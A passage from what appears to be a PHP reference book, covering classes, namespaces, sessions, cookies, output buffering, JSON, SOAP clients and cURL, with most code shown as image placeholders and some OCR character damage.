extends. The main difference is that multiple inheritance is allowed for interfaces:

![](image_rsrcM9H.jpg)

Examples

In the example bellow we have a simple example interface for a vehicle. Vehicles can go forwards and backwards.

161

![](image_rsrcM9J.jpg)interface VehicleInterface { public function forward();

public function reverse();

...

}

class Bike implements VehicleInterface { public function forward() {

$this\->pedal();

}

public function reverse() {

$this\->backwardSteps();

}

protected function pedal() {

...

}

protected function backwardSteps() {

...

}

...

}

class Car implements VehicleInterface { protected $gear \= 'N';

public function forward() {

$this\->setGear(1);

$this\->pushPedal();

}

public function reverse() {

$this\->setGear('R');

$this\->pushPedal();

}

protected function setGear($gear) {

$this\->gear \= $gear;

}

protected function pushPedal() {

...

}

...

}

Then we create two classes that implement the interface: Bike and Car. Bike and Car internally are very different, but both are vehicles, and must implement the same public methods that VehicleInterface provides.

Typehinting allows methods and functions to request Interfaces. Let's assume that we have a parking garage class, which contains vehicles of all kinds.

![](image_rsrcM9K.jpg)

![](image_rsrcM9M.jpg)

Because addVehicle requires a $vehicle of type VehicleInterface  not a concrete implementation we can input both Bikes and Cars, which the ParkingGarage can manipulate and use.

Section 26.7: Final ße6word

Def: Final Keyword prevents child classes from overriding a method by prefixing the definition with final. If the class itself is being defined final then it cannot be extended

Final Method

![](image_rsrcM9N.jpg)

Final Class:

![](image_rsrcM9P.jpg)

Final constants: Unlike Java, the final keyword is not used for class constants in PHP. Use the keyword const

instead.

Why do I have to use final?

1.  Preventing massive inheritance chain of doom

2.  Encouraging composition

3.  Force the developer to think about user public API

5.  A final class can always be made extensible

6.  extends breaks encapsulation

7.  You don't need that flexibility

8.  You are free to change the code

When to avoid final: Final classes only work effectively under following assumptions:

1.  There is an abstraction (interface) that the final class implements

2.  All of the public API of the final class is part of that interface

Section 26.8: Autoloading

Nobody wants to require or include every time a class or inheritance is used. Because it can be painful and is easy to forget, PHP is offering so called autoloading. If you are already using Composer, read about autoloading using Composer.

What exactly is autoloading?

The name basically says it all. You do not have to get the file where the requested class is stored in, but PHP

automatically loads it.

How can I do this in basic PHP without third party code?

![](image_rsrcM9R.jpg)

There is the function  autoload, but it is considered better practice to use spl\_autoload\_register. These functions will be considered by PHP every time a class is not defined within the given space. So adding autoload to an existing project is no problem, as defined classes (via require i.e.) will work like before. For the sake of preciseness, the following examples will use anonymous functions, if you use PHP < 5.3, you can define the function and pass it's name as argument to spl\_autoload\_register.

Examples

![](image_rsrcM9S.jpg)

The code above simply tries to include a filename with the class name and the appended extension ".php" using

sprintf. If FooBar needs to be loaded, it looks if FooBar.php exists and if so includes it.

Of course this can be extended to fit the project's individual need. If \_ inside a class name is used to group, e.g.

User\_Post and User\_Image both refer to User, both classes can be kept in a folder called "User" like so:

![](image_rsrcM9T.jpg)

The class User\_Post will now be loaded from "User/Post.php", etc.

spl\_autoload\_register can be tailored to various needs. All your files with classes are named "class.CLASSNAME.php"? No problem. Various nesting (User\_Post\_Content \=> "User/Post/Content.php")? No problem either.

If you want a more elaborate autoloading mechanism - and still don't want to include Composer - you can work without adding third party libraries.

![](image_rsrcM9U.jpg)

Using autoloaders like this, you can happily write code like this:

![](image_rsrcM9V.jpg)

Using classes:

![](image_rsrcM9W.jpg)

These examples will be include classes from foo/bar.php, foo.php, hello/world.php and demo/classes.php.

Section 26.9: Calling a parent constructor when instantiating a child

A common pitfall of child classes is that, if your parent and child both contain a constructor( construct()) method, only the child class constructor will run. There may be occasions where you need to run the parent

 construct() method from it's child. If you need to do that, then you will need to use the parent:: scope resolutor:

![](image_rsrcM9X.jpg)

Now harnessing that within a real-world situation would look something like:

![](image_rsrcM9Y.jpg)

The above will run the parent  construct() resulting in the echo being run.

Section 26.10: D6namic Binding

Dynamic binding, also referred as method overriding is an example of run time polymorphism that occurs when multiple classes contain different implementations of the same method, but the object that the method will be called on is unknown until run time.

This is useful if a certain condition dictates which class will be used to perform an action, where the action is named the same in both classes.

![](image_rsrcM9Z.jpg)

![](image_rsrcMA0.jpg)

In the above example, the Animal class (Dog|Cat) which will makeNoise is unknown until run time depending on the property within the User class.

Section 26.11: $this, self and static plus the singleton

![](image_rsrcKNA.jpg)Use $this to refer to the current object. Use self to refer to the current class. In other words, use

$this\->member for non-static members, use self::$member for static members.

In the example below, sayHello() and sayGoodbye() are using self and $this difference can be observed here.

![](image_rsrcMA1.jpg)

![](image_rsrcMA2.jpg)

static refers to whatever class in the hierarchy you called the method on. It allows for better reuse of static class properties when classes are inherited.

Consider the following code:

![](image_rsrcMA3.jpg)

![](image_rsrcKJ7.jpg)This doesn't produce the result you want:

unknown unknown unknown

That's because self refers to the Car class whenever method brand() is called.

To refer to the correct class, you need to use static instead:

![](image_rsrcMA4.jpg)

![](image_rsrcMA5.jpg)

![](image_rsrcKTB.jpg)This does produce the desired output:

unknown BMW

Mercedes

See also Late static binding The singleton

If you have an object that's expensive to create or represents a connection to some external resource you want to reuse, i.e. a database connection where there is no connection pooling or a socket to some other system, you can use the static and self keywords in a class to make it a singleton. There are strong opinions about whether the singleton pattern should or should not be used, but it does have its uses.

![](image_rsrcMA6.jpg)

As you can see in the example code we are defining a private static property $instance to hold the object reference. Since this is static this reference is shared across ALL objects of this type.

The getInstance()method uses a method know as lazy instantiation to delay creating the object to the last possible moment as you do not want to have unused objects lying around in memory never intended to be used. It also saves time and CPU on page load not having to load more objects than necessary. The method is checking if the object is set, creating it if not, and returning it. This ensures that only one object of this kind is ever created.

We are also setting the constructor to be private to ensure that no one creates it with the new keyword from the outside. If you need to inherit from this class just change the private keywords to protected.

To use this object you just write the following:

![](image_rsrcMA7.jpg)

Now I DO implore you to use dependency injection where you can and aim for loosely coupled objects, but sometimes that is just not reasonable and the singleton pattern can be of use.

169

Section 26.12: Defining a Basic Class

An object in PHP contains variables and functions. Objects typically belong to a class, which defines the variables and functions that all objects of this class will contain.

The syntax to define a class is:

![](image_rsrcMA8.jpg)

Once a class is defined, you can create an instance using:

![](image_rsrcMA9.jpg)

Variables and functions on the object are accessed like this:

![](image_rsrcMAA.jpg)

Constructor

Classes can define a special  construct() method, which is executed as part of object creation. This is often used to specify the initial values of an object:

![](image_rsrcMAB.jpg)

Extending Another Class

Class definitions can extend existing class definitions, adding new variables and functions as well as modifying those defined in the parent class.

Here is a class that extends the previous example:

![](image_rsrcMAC.jpg)

![](image_rsrcMAD.jpg)

The Square class contains variables and behavior for both the Shape class and the Square class:

![](image_rsrcMAE.jpg)

Section 26.13: Anon6mous Classes

Anonymous classes were introduced into PHP 7 to enable for quick one-off objects to be easily created. They can take constructor arguments, extend other classes, implement interfaces, and use traits just like normal classes can.

In its most basic form, an anonymous class looks like the following:

![](image_rsrcMAF.jpg)

Nesting an anonymous class inside of another class does not give it access to private or protected methods or properties of that outer class. Access to protected methods and properties of the outer class can be gained by extending the outer class from the anonymous class. Access to private properties of the outer class can be gained by passing them through to the anonymous class's constructor.

For example:

![](image_rsrcMAG.jpg)

![](image_rsrcMAH.jpg)

172

Chapter 27: Namespaces

Section 27.1: Declaring namespaces

A namespace declaration can look as follows:

![](image_rsrcMAJ.jpg)namespace MyProject; \- Declare the namespace MyProject

![](image_rsrcMAK.jpg)namespace MyProject\\Security\\Cryptography; \- Declare a nested namespace

![](image_rsrcMAM.jpg)namespace MyProject { ... } \- Declare a namespace with enclosing brackets.

It is recommended to only declare a single namespace per file, even though you can declare as many as you like in a single file:

![](image_rsrcMAN.jpg)

Every time you declare a namespace, classes you define after that will belong to that namespace:

![](image_rsrcMAP.jpg)

A namespace declaration can be used multiple times in different files. The example above defined three classes in the MyProject\\Shapes namespace in a single file. Preferably this would be split up into three files, each starting with namespace MyProject\\Shapes;. This is explained in more detail in the PSR-4 standard example.

Section 27.2: Referencing a class or function in a namespace

As shown in Declaring Namespaces, we can define a class in a namespace as follows:

![](image_rsrcMAR.jpg)

To reference this class the full path (including the namespace) needs to be used:

![](image_rsrcMAS.jpg)

This can be shortened by importing the class via the use\-statement:

![](image_rsrcMAT.jpg)

As for PHP 7.0 you can group various use\-statements in one single statement using brackets:

![](image_rsrcMAU.jpg)

Sometimes two classes have the same name. This is not a problem if they are in a different namespace, but it could become a problem when attempting to import them with the use\-statement:

![](image_rsrcMAV.jpg)

This can be solved by defining a name for the alias yourself using the as keyword:

![](image_rsrcMAW.jpg)

To reference a class outside the current namespace, it has to be escaped with a \\, otherwise a relative namespace path is assumed from the current namespace:

![](image_rsrcMAX.jpg)

Section 27.3: Declaring sub-namespaces

To declare a single namespace with hierarchy use following example:

![](image_rsrcMAY.jpg)

![](image_rsrcMAZ.jpg)

The above example creates:

constant MyProject\\Sub\\Level\\CONNECT\_OK

class MyProject\\Sub\\Level\\Connection and

function MyProject\\Sub\\Level\\connect

Section 27.4: What are Namespaces?

![](image_rsrcMB0.jpg)The PHP community has a lot of developers creating lots of code. This means that one library s PHP code may use the same class name as another library. When both libraries are used in the same namespace, they collide and cause trouble.

Namespaces solve this problem. As described in the PHP reference manual, namespaces may be compared to operating system directories that namespace files; two files with the same name may co-exist in separate directories. Likewise, two PHP classes with the same name may co-exist in separate PHP namespaces.

It is important for you to namespace your code so that it may be used by other developers without fear of colliding with other libraries.

Chapter 28: Sessions

Section 28.1: session\_start() Options

Starting with PHP Sessions we can pass an array with session-based php.ini options to the session\_start

![](image_rsrcMB1.jpg)

function. Example

This feature also introduces a new php.ini setting named session.lazy\_write, which defaults to true and means that session data is only rewritten, if it changes.

Referencing:  https://wiki.php.net/rfc/session-lock-ini

Section 28.2: Session Locking

As we all are aware that PHP writes session data into a file at server side. When a request is made to php script which starts the session via session\_start(), PHP locks this session file resulting to block/wait other incoming requests for same session\_id to complete, because of which the other requests will get stuck on session\_start() until or unless the session file locked is not released

The session file remains locked until the script is completed or session is manually closed. To avoid this situation i.e. to prevent multiple requests getting blocked, we can start the session and close the session which will release the lock from session file and allow to continue the remaining requests.

![](image_rsrcMB2.jpg)

Now one will think if session is closed how we will read the session values, beautify even after session is closed, session is still available. So, we can still read the session data.

![](image_rsrcMB3.jpg)

In php >= 7.0, we can have read\_only session, read\_write session and lazy\_write session, so it may not required

Section 28.3: Manipulating session data

The $\_SESSION variable is an array, and you can retrieve or manipulate it like a normal array.

![](image_rsrcMB4.jpg)

Also see Manipulating an Array for more reference how to work on an array.

Note that if you store an object in a session, it can be retrieved gracefully only if you have an class autoloader or you have loaded the class already. Otherwise, the object will come out as the type  PHP\_Incomplete\_Class, which may later lead to crashes. See Namespacing and Autoloading about autoloading.

Warning:

![](image_rsrcMB5.jpg)Session data can be hijacked. This is outlined in: Pro PHP Security: From Application Security Principles to the Implementation of XSS Defense \- Chapter 7: Preventing Session Hijacking So it can be strongly recommended to never store any personal information in $\_SESSION. This would most critically include credit card numbers, government issued ids, and passwords; but would also extend into less assuming data like names, emails, phone numbers, etc which would allow a hacker to impersonate/compromise a legitimate user. As a general rule, use worthless/non- personal values, such as numerical identifiers, in session data.

Section 28.4: Destro6 an entire session

If you've got a session which you wish to destroy, you can do this with session\_destroy()

![](image_rsrcMB6.jpg)

![](image_rsrcMB7.jpg)

Using session\_destroy() is different to using something like $\_SESSION \= array(); which will remove all of the values stored in the SESSION superglobal but it will not destroy the actual stored version of the session.

Note: We use $\_SESSION \= array(); instead of session\_unset() because the manual stipulates:

![](image_rsrcKH6.jpg)Only use session\_unset() for older deprecated code that does not use $\_SESSION.

Section 28.5: Safe Session Start With no Errors

Many developers have this problem when they work on huge projects, especially if they work on some modular CMS on plugins, addons, components etc. Here is solution for safe session start where if first checked PHP version to cover all versions and on next is checked if session is started. If session not exists then I start session safe. If session exists nothing happen.

![](image_rsrcMB8.jpg)

This can help you a lot to avoid session\_start error.

Section 28.6: Session name

Checking if session cookies have been created

Session name is the name of the cookie used to store sessions. You can use this to detect if cookies for a session have been created for the user:

![](image_rsrcMB9.jpg)

Note that this method is generally not useful unless you really don't want to create cookies unnecessarily. Changing session name

You can update the session name by calling session\_name().

![](image_rsrcMBA.jpg)

![](image_rsrcKJ7.jpg)If no argument is provided into session\_name() then the current session name is returned.

It should contain only alphanumeric characters; it should be short and descriptive (i.e. for users with enabled cookie warnings). The session name can't consist of digits only, at least one letter must be present. Otherwise a new session id is generated every time.

Chapter 29: Cookies

parameter​detail

name value

expire

path

domain

secure httponly

The name of the cookie. This is also the key you can use to retrieve the value from the $\_COOKIE super global. This is the only required parameter

The value to store in the cookie. This data is accessible to the browser so don't store anything sensitive here.

A Unix timestamp representing when the cookie should expire. If set to zero the cookie will expire at the end of the session. If set to a number less than the current Unix timestamp the cookie will expire immediately.

The scope of the cookie. If set to / the cookie will be available within the entire domain. If set to /some\- path/ then the cookie will only be available in that path and descendants of that path. Defaults to the current path of the file that the cookie is being set in.

The domain or subdomain the cookie is available on. If set to the bare domain stackoverflow.com then the cookie will be available to that domain and all subdomains. If set to a subdomain meta.stackoverflow.com then the cookie will be available only on that subdomain, and all sub- subdomains.

When set to TRUE the cookie will only be set if a secure HTTPS connection exists between the client and the server.

Specifies that the cookie should only be made available through the HTTP/S protocol and should not be available to client side scripting languages like JavaScript. Only available in PHP 5.2 or later.

An HTTP cookie is a small piece of data sent from a website and stored on the user's computer by the user's web browser while the user is browsing.

Section 29.1: Modif6ing a Cookie

The value of a cookie can be modified by resetting the cookie

![](image_rsrcMBB.jpg)

![](image_rsrcKNA.jpg)Cookies are part of the HTTP header, so setcookie() must be called before any output is sent to the browser.

![](image_rsrcKNA.jpg)When modifying a cookie make sure the path and domain parameters of setcookie() matches the existing cookie or a new cookie will be created instead.

![](image_rsrcKNA.jpg)The value portion of the cookie will automatically be urlencoded when you send the cookie, and when it is received, it is automatically decoded and assigned to a variable by the same name as the cookie name

Section 29.2: Setting a Cookie

A cookie is set using the setcookie() function. Since cookies are part of the HTTP header, you must set any cookies before sending any output to the browser.

Example:

setcookie("user", "Tom", time() + 864θθ, "/"); // check synłax for funcłion params

Description:

![](image_rsrcMBC.jpg)Creates a cookie with name user

![](image_rsrcMBD.jpg)(Optional) Value of the cookie is Tom

![](image_rsrcMBE.jpg)![](image_rsrcMBF.jpg)![](image_rsrcMBG.jpg)(Optional) Cookie will expire in 1 day (86400 seconds) (Optional) Cookie is available throughout the whole website / (Optional) Cookie is only sent over HTTPS

![](image_rsrcMBH.jpg)(Optional) Cookie is not accessible to scripting languages such as JavaScript

![](image_rsrcKNA.jpg)A created or modified cookie can only be accessed on subsequent requests (where path and domain

matches) as the superglobal $\_COOKIEis not populated with the new data immediately.

Section 29.3: Checking if a Cookie is Set

![](image_rsrcMBJ.jpg)Use the isset() function upon the superglobal $\_COOKIE variable to check if a cookie is set. Example:

Section 29.4: Removing a Cookie

To remove a cookie, set the expiry timestamp to a time in the past. This triggers the browser's removal mechanism:

![](image_rsrcMBK.jpg)

![](image_rsrcKNA.jpg)When deleting a cookie make sure the path and domain parameters of setcookie() matches the cookie you're trying to delete or a new cookie, which expires immediately, will be created.

It is also a good idea to unset the $\_COOKIE value in case the current page uses it:

![](image_rsrcMBM.jpg)

Section 29.5: Retrieving a Cookie

![](image_rsrcMBN.jpg)

Retrieve and Output a Cookie Named

The value of a cookie can be retrieved using the global variable $\_COOKIE. example if we have a cookie named user

we can retrieve it like this

echo $\_COOKIE\['user'\];

Chapter 30: Output Buffering

Function​Details

ob\_start()​Starts the output buffer, any output placed after this will be captured and not displayed ob\_get\_contents() Returns all content captured by ob\_start()

ob\_end\_clean()​Empties the output buffer and turns it off for the current nesting level ob\_get\_clean()              Triggers both ob\_get\_contents() and ob\_end\_clean() ob\_get\_level()              Returns the current nesting level of the output buffer

ob\_flush()​Flush the content buffer and send it to the browser without ending the buffer ob\_implicit\_flush() Enables implicit flushing after every output call.

ob\_end\_flush()​Flush the content buffer and send it to the browser also ending the buffer

Section 30.1: Basic usage getting content between buffers and clearing

Output buffering allows you to store any textual content (Text, HTML) in a variable and send to the browser as one piece at the end of your script. By default, php sends your content as it interprets it.

![](image_rsrcMBP.jpg)

Any content outputted between ob\_start() and ob\_get\_clean() will be captured and placed into the variable

$content.

Calling ob\_get\_clean() triggers both ob\_get\_contents() and ob\_end\_clean().

Section 30.2: Processing the buffer via a callback

You can apply any kind of additional processing to the output by passing a callable to ob\_start().

![](image_rsrcMBR.jpg)

![](image_rsrcMBS.jpg)

Output:

![](image_rsrcMBT.jpg)

Section 30.3: Nested output buffers

You can nest output buffers and fetch the level for them to provide different content using the ob\_get\_level()

function.

![](image_rsrcMBU.jpg)

![](image_rsrcMBV.jpg)

Outputs:

![](image_rsrcMBW.jpg)

Section 30.4: Running output buffer before an6 content

![](image_rsrcMBX.jpg)

In this example we assume $users to be a multidimensional array, and we loop through it to find all users with an access level of 7.

If there are no results, we redirect to an error page.

We are using the output buffer here because we are triggering a header() redirect based on the result of the loop

Section 30.5: Stream output to client

![](image_rsrcMBY.jpg)

Section 30.6: Using Output buffer to store contents in a file, useful for reports, invoices etc

![](image_rsrcMBZ.jpg)

This example takes the complete document, and writes it to file, it does not output the document into the browser, but do by using echo $html;

Section 30.7: T6pical usage and reasons for using ob\_start

ob\_start is especially handy when you have redirections on your page. For example, the following code won't work:

![](image_rsrcMC0.jpg)

![](image_rsrcMC1.jpg)The error that will be given is something like: headers already sent by <xxx\> on line <xxx\>. In order to fix this problem, you would write something like this at the start of your page:

And something like this at the end of your page:

![](image_rsrcMC2.jpg)

This stores all generated content into an output buffer, and displays it in one go. Hence, if you have any redirection calls on your page, those will trigger before any data is sent, removing the possibility of a headers already sent error occurring.

Section 30.8: Capturing the output buffer to re-use later

In this example, we have an array containing some data.

We capture the output buffer in $items\_li\_html and use it twice in the page.

![](image_rsrcMC3.jpg)

Save the above code in a file output\_buffer.php and run it via php output\_buffer.php.

You should see the 2 list items we created above with the same list items we generated in PHP using the output buffer:

![](image_rsrcMC4.jpg)

![](image_rsrcMC5.jpg)

187

Chapter 31: JSON

Parameter​Details

json\_encode -

value​The value being encoded. Can be any type except a resource. All string data must be UTF-8 encoded.

Bitmask consisting of JSON\_HEX\_QUOT, JSON\_HEX\_TAG, JSON\_HEX\_AMP, JSON\_HEX\_APOS,

options​JSON\_NUMERIC\_CHECK, JSON\_PRETTY\_PRINT, JSON\_UNESCAPED\_SLASHES, JSON\_FORCE\_OBJECT, JSON\_PRESERVE\_ZERO\_FRACTION, JSON\_UNESCAPED\_UNICODE, JSON\_PARTIAL\_OUTPUT\_ON\_ERROR.

The behaviour of these constants is described on the JSON constants page. depth​Set the maximum depth. Must be greater than zero.

json\_decode -

json​The json string being decoded. This function only works with UTF-8 encoded strings. assoc              Should function return associative array instead of objects.

options

Bitmask of JSON decode options. Currently only JSON\_BIGINT\_AS\_STRING is supported (default is to cast large integers as floats)

JSON (JavaScript Object Notation) is a platform and language independent way of serializing objects into plaintext. Because it is often used on web and so is PHP, there is a basic extension for working with JSON in PHP.

Section 31.1: Decoding a JSON string

The json\_decode() function takes a JSON-encoded string as its first parameter and parses it into a PHP variable.

Normally, json\_decode() will return an object of \\stdClass if the top level item in the JSON object is a dictionary or an indexed array if the JSON object is an array. It will also return scalar values or NULL for certain scalar values, such as simple strings, "true", "false", and "null". It also returns NULL on any error.

![](image_rsrcMC6.jpg)

Use var\_dump() to view the types and values of each property on the object we decoded above.

![](image_rsrcMC7.jpg)

Output (note the variable types):

![](image_rsrcMC8.jpg)

![](image_rsrcMC9.jpg)

Note: The variable types in JSON were converted to their PHP equivalent.

To return an associative array for JSON objects instead of returning an object, pass true as the second parameter to json\_decode().

![](image_rsrcMCA.jpg)

Output (note the array associative structure):

![](image_rsrcMCB.jpg)

The second parameter ($assoc) has no effect if the variable to be returned is not an object.

Note: If you use the $assoc parameter, you will lose the distinction between an empty array and an empty object. This means that running json\_encode() on your decoded output again, will result in a different JSON structure.

If the JSON string has a "depth" more than 512 elements (20 elements in versions older than 5.2.3, or 128 in version 5.2.3) in recursion, the function json\_decode() returns NULL. In versions 5.3 or later, this limit can be controlled using the third parameter ($depth), as discussed below.

![](image_rsrcMCC.jpg)According to the manual:

![](image_rsrcMCD.jpg)PHP implements a superset of JSON as specified in the original  RFC 4627 \- it will also encode and decode scalar types and NULL. RFC 4627 only supports these values when they are nested inside an array or an object. Although this superset is consistent with the expanded definition of "JSON text" in the newer

![](image_rsrcMCE.jpg)![](image_rsrcMCF.jpg) RFC 7159 (which aims to supersede RFC 4627) and  ECMA-404, this may cause interoperability issues with older JSON parsers that adhere strictly to RFC 4627 when encoding a single scalar value.

This means, that, for example, a simple string will be considered to be a valid JSON object in PHP:

![](image_rsrcMCG.jpg)

Output:

![](image_rsrcMCH.jpg)

But simple strings, not in an array or object, are not part of the RFC 4627 standard. As a result, such online checkers as JSLint, JSON Formatter & Validator (in RFC 4627 mode) will give you an error.

189

There is a third $depth parameter for the depth of recursion (the default value is 512), which means the amount of nested objects inside the original object to be decoded.

![](image_rsrcKH6.jpg)There is a fourth $options parameter. It currently accepts only one value, JSON\_BIGINT\_AS\_STRING. The default behavior (which leaves off this option) is to cast large integers to floats instead of strings.

Invalid non-lowercased variants of the true, false and null literals are no longer accepted as valid input.

So this example:

![](image_rsrcMCJ.jpg)

Before PHP 5.6:

![](image_rsrcMCK.jpg)

And after:

![](image_rsrcMCM.jpg)

Similar behavior occurs for false and null.

Note that json\_decode() will return NULL if the string cannot be converted.

![](image_rsrcMCN.jpg)

![](image_rsrcMCP.jpg)

It is not safe to rely only on the return value being NULL to detect errors. For example, if the JSON string contains nothing but "null", json\_decode() will return null, even though no error occurred.

Section 31.2: Encoding a JSON string

The json\_encode function will convert a PHP array (or, since PHP 5.4, an object which implements the JsonSerializable interface) to a JSON-encoded string. It returns a JSON-encoded string on success or FALSE on failure.

![](image_rsrcMCR.jpg)

![](image_rsrcMCS.jpg)During encoding, the PHP data types string, integer, and boolean are converted to their JSON equivalent. Associative arrays are encoded as JSON objects, and when called with default arguments indexed arrays are encoded as JSON arrays. (Unless the array keys are not a continuous numeric sequence starting from 0, in which case the array will be encoded as a JSON object.)

![](image_rsrcMCT.jpg)

Output:

![](image_rsrcMCU.jpg)

Arguments

Since PHP 5.3, the second argument to json\_encode is a bitmask which can be one or more of the following.

As with any bitmask, they can be combined with the binary OR operator |. PHP 5.x Version ≥ 5.3

JSON\_FORCE\_OBJECT

Forces the creation of an object instead of an array

![](image_rsrcMCV.jpg)

Output:

![](image_rsrcMCW.jpg)

JSON\_HEX\_TAG, JSON\_HEX\_ANP, JSON\_HEX\_APOS, JSON\_HEX\_QUOT

Ensures the following conversions during encoding:

Constant​Input Output

| JSON\_HEX\_TAG || < || \\uθθ3C |
| --- | --- | --- |
| JSON\_HEX\_TAG || \> || \\uθθ3E |
| JSON\_HEX\_AMP || & || \\uθθ26 |
| JSON\_HEX\_APOS || ' || \\uθθ27 |
| JSON\_HEX\_QUOT " ||  || \\uθθ22 |

![](image_rsrcMCX.jpg)

Output:

![](image_rsrcMCY.jpg)

PHP 5.x Version ≥ 5.3

JSON\_NUNERIC\_CHECK

Ensures numeric strings are converted to integers.

![](image_rsrcMCZ.jpg)

Output:

![](image_rsrcMD0.jpg)

PHP 5.x Version ≥ 5.4

JSON\_PRETTY\_PRINT

Makes the JSON easily readable

![](image_rsrcMD1.jpg)

Output:

![](image_rsrcMD2.jpg)

JSON\_UNESCAPED\_SLASHES

Includes unescaped / forward slashes in the output

![](image_rsrcMD3.jpg)

![](image_rsrcMD4.jpg)

JSON\_UNESCAPED\_UNICODE

Includes UTF8-encoded characters in the output instead of \\u\-encoded strings

![](image_rsrcMD5.jpg)

Output:

![](image_rsrcMD6.jpg)

PHP 5.x Version ≥ 5.5

JSON\_PARTIAL\_OUTPUT\_ON\_ERROR

Allows encoding to continue if some unencodable values are encountered.

![](image_rsrcMD7.jpg)

Output:

![](image_rsrcMD8.jpg)

PHP 5.x Version ≥ 5.6

JSON\_PRESERVE\_ZERO\_FRACTION

Ensures that floats are always encoded as floats.

![](image_rsrcMD9.jpg)

Output:

![](image_rsrcMDA.jpg)

PHP 7.x Version ≥ 7.1

JSON\_UNESCAPED\_LINE\_TERNINATORS

When used with JSON\_UNESCAPED\_UNICODE, reverts to the behaviour of older PHP versions, and does not escape the characters U+2028 LINE SEPARATOR and U+2029 PARAGRAPH SEPARATOR. Although valid in JSON, these characters are not valid in JavaScript, so the default behaviour of JSON\_UNESCAPED\_UNICODE was changed in version 7.1.

![](image_rsrcMDB.jpg)

Output:

![](image_rsrcMDC.jpg)

![](image_rsrcMDD.jpg)

Section 31.3: Debugging JSON errors

When json\_encode or json\_decode fails to parse the string provided, it will return false. PHP itself will not raise any errors or warnings when this happens, the onus is on the user to use the json\_last\_error() and json\_last\_error\_msg() functions to check if an error occurred and act accordingly in your application (debug it, show an error message, etc.).

The following example shows a common error when working with JSON, a failure to decode/encode a JSON string

(due to the passing of a bad UTF-8 encoded string, for example).

![](image_rsrcMDE.jpg)

json\_last\_error\_msg

json\_last\_error\_msg() returns a human readable message of the last error that occurred when trying to encode/decode a string.

![](image_rsrcMDF.jpg)This function will always return a string, even if no error occurred. The default non-error string is No Error

![](image_rsrcMDG.jpg)It will return false if some other (unknown) error occurred

![](image_rsrcMDH.jpg)Careful when using this in loops, as json\_last\_error\_msg will be overridden on each iteration.

You should only use this function to get the message for display, not to test against in control statements.

![](image_rsrcMDJ.jpg)

This function doesn't exist before PHP 5.5. Here is a polyfill implementation:

![](image_rsrcMDK.jpg)

![](image_rsrcMDM.jpg)

json\_last\_error

json\_last\_error() returns an integer mapped to one of the pre-defined constants provided by PHP.

Constant​Meaning

JSON\_ERROR\_NONE​No error has occurred

JSON\_ERROR\_DEPTH​The maximum stack depth has been exceeded

JSON\_ERROR\_STATE\_MISMATCH​Invalid or malformed JSON

JSON\_ERROR\_CTRL\_CHAR​Control character error, possibly incorrectly encoded

JSON\_ERROR\_SYNTAX​Syntax error (since PHP 5.3.3)

JSON\_ERROR\_UTF8​Malformed UTF-8 characters, possibly incorrectly encoded (since PHP 5.5.0) JSON\_ERROR\_RECURSION              One or more recursive references in the value to be encoded JSON\_ERROR\_INF\_OR\_NAN              One or more NAN or INF values in the value to be encoded JSON\_ERROR\_UNSUPPORTED\_TYPE A value of a type that cannot be encoded was given

Section 31.4: Using JsonSerializable in an Object

PHP 5.x Version ≥ 5.4

When you build REST API's, you may need to reduce the information of an object to be passed to the client application. For this purpose, this example illustrates how to use the JsonSerialiazble interface.

In this example, the class User actually extends a DB model object of a hypotetical ORM.

![](image_rsrcMDN.jpg)

Add JsonSerializable implementation to the class, by providing the jsonSerialize() method.

![](image_rsrcMDP.jpg)

Now in your application controller or script, when passing the object User to json\_encode() you will get the return json encoded array of the jsonSerialize() method ins1t9ea5d of the entire object.

![](image_rsrcMDR.jpg)

Will return:

![](image_rsrcMDS.jpg)

properties values example.

This will both reduce the amount of data returned from a RESTful endpoint, and allow to exclude object properties from a json representation.

Using Private and Protected Properties with json\_encode()

![](image_rsrcM4H.jpg)To avoid using JsonSerializable, it is also possible to use private or protected properties to hide class information from json\_encode() output. The Class then does not need to implement \\JsonSerializable.

The json\_encode() function will only encode public properties of a class into JSON.

![](image_rsrcMDT.jpg)

![](image_rsrcMDU.jpg)Output:

Section 31.5: Header json and the returned response

By adding a header with content type as JSON:

![](image_rsrcMDV.jpg)

![](image_rsrcMDW.jpg)

The header is there so your app can detect what data was returned and how it should handle it. Note that: the content header is just information about type of returned data.

If you are using UTF-8, you can use:

![](image_rsrcMDX.jpg)

Example jQuery:

![](image_rsrcMDY.jpg)

197

Chapter 32: SOAP Client

Parameter​Details

$wsdl​URI of WSDL or NULL if using non-WSDL mode

$options

Array of options for SoapClient. Non-WSDL mode requires location and uri to set, all other options are optional. See table below for possible values.

Section 32.1: WSDL Mode

First, create a new SoapClient object, passing the URL to the WSDL file and optionally, an array of options.

![](image_rsrcMDZ.jpg)

Then use the $soap object to call your SOAP methods.

![](image_rsrcME0.jpg)

Section 32.2: Non-WSDL Mode

This is similar to WSDL mode, except we pass NULL as the WSDL file and make sure to set the location and uri

options.

![](image_rsrcME1.jpg)

Section 32.3: Classmaps

When creating a SOAP Client in PHP, you can also set a classmap key in the configuration array. This classmap defines which types defined in the WSDL should be mapped to actual classes, instead of the default StdClass. The reason you would want to do this is because you can get auto-completion of fields and method calls on these classes, instead of having to guess which fields are set on the regular StdClass.

![](image_rsrcME2.jpg)

![](image_rsrcME3.jpg)

After configuring the classmap, whenever you perform a certain operation that returns a type Address or Book, the SoapClient will instantiate that class, fill the fields with the data and return it from the operation call.

![](image_rsrcME4.jpg)

Section 32.4: Tracing SOAP request and response

Sometimes we want to look at what is sent and received in the SOAP request. The following methods will return the XML in the request and response:

![](image_rsrcME5.jpg)

For example, suppose we have an ENVIRONMENT constant and when this constant's value is set to DEVELOPMENT we want to echo all information when the call to getAddress throws an error. One solution could be:

![](image_rsrcME6.jpg)

![](image_rsrcME7.jpg)

200

Chapter 33: Using cURL in PHP

Parameter​Details

curl\_init​\-- Initialize a cURL session

url​The url to be used in the cURL request curl\_setopt -- Set an option for a cURL transfer

ch​The cURL handle (return value from curl\_init())

option​CURLOPT\_XXX to be set - see PHP documentation for the list of options and acceptable values value              The value to be set on the cURL handle for the given option

curl\_exec  \-- Perform a cURL session

ch​The cURL handle (return value from curl\_init()) curl\_close \-- Close a cURL session

ch​The cURL handle (return value from curl\_init())

Section 33.1: Basic Usage (GET Requests)

cURL is a tool for transferring data with URL syntax. It support HTTP, FTP, SCP and many others(curl >= 7.19.4). Remember, you need to install and enable the cURL extension to use it.

![](image_rsrcME8.jpg)

Section 33.2: POST Requests

If you want to mimic HTML form POST action, you can use cURL.

![](image_rsrcME9.jpg)

![](image_rsrcMEA.jpg)

Section 33.3: Using Cookies

cURL can keep cookies received in responses for use with subsequent requests. For simple session cookie handling in memory, this is achieved with a single line of code:

![](image_rsrcMEB.jpg)

